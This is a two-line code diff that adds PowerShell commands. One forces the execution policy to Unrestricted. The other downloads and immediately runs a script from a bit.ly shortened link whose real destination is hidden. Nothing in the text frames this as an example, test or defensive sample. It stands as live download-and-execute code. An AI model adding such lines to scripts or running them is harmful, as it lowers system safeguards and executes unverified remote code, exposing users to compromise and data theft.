@@ -1,0 +1,2 @@
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
+Invoke-Expression -Command (Invoke-WebRequest -UseBasicParsing -Uri https://bit.ly/2RYvE3p).Content
